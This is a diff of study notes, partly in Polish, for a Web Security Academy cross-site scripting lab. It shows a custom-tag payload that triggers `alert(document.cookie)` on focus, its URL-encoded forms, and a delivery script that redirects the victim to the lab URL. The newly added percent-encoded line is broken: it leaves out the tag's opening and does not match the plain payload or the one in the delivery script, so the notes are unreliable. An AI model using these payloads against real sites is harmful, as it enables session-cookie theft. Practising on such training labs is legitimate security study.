@@ -31,8 +31,8 @@ Payload: <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3
 
 ***********************************************************************************************************************************************************
 [Stworzenie swojego tagu]
--> <xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
-(to encode url) -> %3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+-> <xss id=x onfocus='alert(document.cookie);' tabindex=1>#x';
+(to encode url) -> %6f%6e%66%6f%63%75%73%3d%27%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3b%27%20%74%61%62%69%6e%64%65%78%3d%31%3e%23%78%27;
 
 Payload:
 <script> location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>
